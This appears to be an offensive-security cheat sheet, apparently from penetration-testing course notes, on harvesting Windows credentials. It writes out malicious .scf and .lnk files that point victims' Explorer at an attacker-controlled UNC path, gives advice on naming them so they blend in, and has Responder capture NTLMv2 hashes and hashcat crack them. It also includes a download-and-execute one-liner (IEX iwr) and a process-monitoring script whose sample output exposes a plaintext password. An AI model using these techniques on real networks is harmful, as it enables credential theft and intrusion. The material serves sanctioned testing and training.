### Content

- [Traffic Capture](#traffic-capture)
	- [Abusing SCF Files](#abusing-scf-files)
	- [Abusing lnk Files](#abusing-lnk-files)
- [Processes Command Lines Monitoring](#processes-command-lines-monitoring)

---
### Traffic Capture

Use Wireshark, tcpdump, Inveigh, responder or the tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a PCAP file.

#### Abusing SCF Files

SCF or Shell Command Files are Windows Explorer Command files that can be used to to launch commands by Windows Explorer.

An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the `.scf` file resides is accessed.

Name it something like `@FileName.scf` (similar to another file in the directory, so it does not appear out of place) and put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed.

1. Access the available share on the target.
2. Use [UserWritableLocations.ps1](https://gist.github.com/hinchley/ade9528e5ce986e9a8131489ad852789) to check the writable directories.
3. Add the `.scf` file to the writeable directory with content like this
	```PowerShell
	[Shell]
	Command=2
	IconFile=\\<Attacket_IP>\share\legit.ico
	[Taskbar]
	Command=ToggleDesktop
	```
4. Start Responder on the attack host to capture any `NTLMv2-SSP` hash `sudo responder -wF -v -I tun0`
5. Crack it with `hashcat -m 5600 hash rockyou.txt`

>- You should hard code the start search path inside the [UserWritableLocations.ps1](https://gist.github.com/hinchley/ade9528e5ce986e9a8131489ad852789) script.
>- Using SCFs no longer works on Server 2019 hosts.

#### Abusing lnk Files

An `.lnk` file in Windows is a shortcut file that provides a quick way to access files, folders, or applications. It acts as a pointer to the original file's location without duplicating the actual data.

Use [Lnkbomb](https://github.com/dievus/lnkbomb) to generate a malicious `.lnk` file or use this PowerShell script:

```PowerShell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

1. Access the available share on the target.
2. Use [UserWritableLocations.ps1](https://gist.github.com/hinchley/ade9528e5ce986e9a8131489ad852789) to check the writable directories.
3. Transfer the `CreateMaliciousLnkFile.ps1` (PowerShell snippet from above) to the target
	1. Edit it the Attacker IP.
	2. Edit the location of the generated `.lnk` file to be create on the writeable folder 
	3. Run it `PS C:\> .\CreateMaliciousLnkFile.ps1`
4. Start Responder on the attack host to capture any `NTLMv2-SSP` hash `sudo responder -wF -v -I tun0`
5. Crack it with `hashcat -m 5600 hash rockyou.txt`

---
### Processes Command Lines Monitoring

Use the following PowerShell script to capture process command lines every two seconds and compares the current state with the previous state, outputting any differences.

```PowerShell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

Executing it:

```PowerShell
PS C:\htb> IEX (iwr 'http://10.10.10.10/procmon.ps1') 

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>      
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
@{CommandLine=net use T: \\sql02\backups /user:CORP\sqlsvc P@ssw07d123!}       =>       
```

---